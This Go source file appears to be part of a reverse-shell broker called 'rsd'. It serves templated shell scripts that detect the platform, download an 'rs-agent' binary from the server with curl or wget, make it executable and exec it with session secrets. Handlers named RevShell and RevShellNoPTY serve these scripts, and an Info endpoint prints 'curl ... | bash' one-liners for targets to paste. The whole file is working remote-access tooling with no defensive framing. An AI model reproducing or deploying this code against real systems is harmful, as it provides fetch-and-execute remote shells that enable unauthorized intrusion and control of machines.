package payload

import (
	"fmt"
	"net/http"
	"strings"
	"text/template"

	"github.com/go-chi/chi/v5"
)

var bootstrapSh = template.Must(template.New("bootstrap").Parse(`#!/bin/sh
set -e
SERVER="{{.BaseURL}}"
SESSION="{{.SessionID}}"
SECRET="{{.Secret}}"

OS=$(uname -s 2>/dev/null | tr '[:upper:]' '[:lower:]' || echo linux)
ARCH=$(uname -m 2>/dev/null || echo unknown)
case "$ARCH" in
  x86_64|amd64) ARCH=amd64 ;;
  aarch64|arm64) ARCH=arm64 ;;
  i686|i386) ARCH=386 ;;
  *) ARCH=unknown ;;
esac
case "$OS" in
  linux|darwin) ;;
  *) OS=linux ;;
esac
PLATFORM="$OS-$ARCH"

download() {
  url="$SERVER/$SESSION/agent/$PLATFORM"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$url" -o "$1" && chmod +x "$1" && return 0
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -qO "$1" "$url" && chmod +x "$1" && return 0
  fi
  return 1
}

TMP="${TMPDIR:-/tmp}/rs-agent.$$"
if download "$TMP"; then
  exec env RSD_SERVER="$SERVER" RSD_SESSION="$SESSION" RSD_SECRET="$SECRET" "$TMP"
fi

echo "rs-agent download failed for $PLATFORM (no curl/wget or binary missing on server)" >&2
exit 1
`))

var bootstrapNoPTY = template.Must(template.New("bootstrap-nopty").Parse(`#!/bin/sh
set -e
SERVER="{{.BaseURL}}"
SESSION="{{.SessionID}}"
SECRET="{{.Secret}}"

OS=$(uname -s 2>/dev/null | tr '[:upper:]' '[:lower:]' || echo linux)
ARCH=$(uname -m 2>/dev/null || echo unknown)
case "$ARCH" in
  x86_64|amd64) ARCH=amd64 ;;
  aarch64|arm64) ARCH=arm64 ;;
  i686|i386) ARCH=386 ;;
  *) ARCH=unknown ;;
esac
case "$OS" in
  linux|darwin) ;;
  *) OS=linux ;;
esac
PLATFORM="$OS-$ARCH"

download() {
  url="$SERVER/$SESSION/agent/$PLATFORM"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL "$url" -o "$1" && chmod +x "$1" && return 0
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -qO "$1" "$url" && chmod +x "$1" && return 0
  fi
  return 1
}

TMP="${TMPDIR:-/tmp}/rs-agent.$$"
if download "$TMP"; then
  exec env RSD_NO_PTY=1 RSD_SERVER="$SERVER" RSD_SESSION="$SESSION" RSD_SECRET="$SECRET" "$TMP"
fi

echo "rs-agent download failed for $PLATFORM (no curl/wget or binary missing on server)" >&2
exit 1
`))

type shimData struct {
	BaseURL   string
	SessionID string
	Secret    string
}

type PayloadHandler struct {
	PublicURL string
}

// BaseURL prefers the request Host so Docker targets reach the broker correctly.
func BaseURL(r *http.Request, configured string) string {
	if r != nil && r.Host != "" {
		scheme := "http"
		if r.TLS != nil {
			scheme = "https"
		}
		if proto := r.Header.Get("X-Forwarded-Proto"); proto != "" {
			scheme = proto
		}
		return scheme + "://" + r.Host
	}
	return strings.TrimRight(configured, "/")
}

func (h *PayloadHandler) RevShell(w http.ResponseWriter, r *http.Request, sessionID, secret string) {
	w.Header().Set("Content-Type", "text/plain")
	_ = bootstrapSh.Execute(w, shimData{
		BaseURL:   BaseURL(r, h.PublicURL),
		SessionID: sessionID,
		Secret:    secret,
	})
}

func (h *PayloadHandler) RevShellNoPTY(w http.ResponseWriter, r *http.Request, sessionID, secret string) {
	w.Header().Set("Content-Type", "text/plain")
	_ = bootstrapNoPTY.Execute(w, shimData{
		BaseURL:   BaseURL(r, h.PublicURL),
		SessionID: sessionID,
		Secret:    secret,
	})
}

func (h *PayloadHandler) ShellShim(w http.ResponseWriter, r *http.Request) {
	h.RevShell(w, r, chi.URLParam(r, "id"), chi.URLParam(r, "secret"))
}

func (h *PayloadHandler) PythonShim(w http.ResponseWriter, r *http.Request) {
	// legacy alias: same bootstrap wrapper
	h.RevShell(w, r, chi.URLParam(r, "id"), chi.URLParam(r, "secret"))
}

func (h *PayloadHandler) Info(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")
	secret := chi.URLParam(r, "secret")
	base := BaseURL(r, h.PublicURL)
	w.Header().Set("Content-Type", "text/plain")
	fmt.Fprintf(w, "# rsd session %s\n\n", sessionID)
	fmt.Fprintf(w, "curl -fsSL %s/%s/revshell | bash\n", base, sessionID)
	fmt.Fprintf(w, "curl -fsSL %s/%s/nopty | bash   # HTTP command mode, no PTY\n\n", base, sessionID)
	fmt.Fprintf(w, "# agent direct (after download):\n")
	fmt.Fprintf(w, "# RSD_SERVER=%s RSD_SESSION=%s RSD_SECRET=%s ./rs-agent\n", base, sessionID, secret)
}
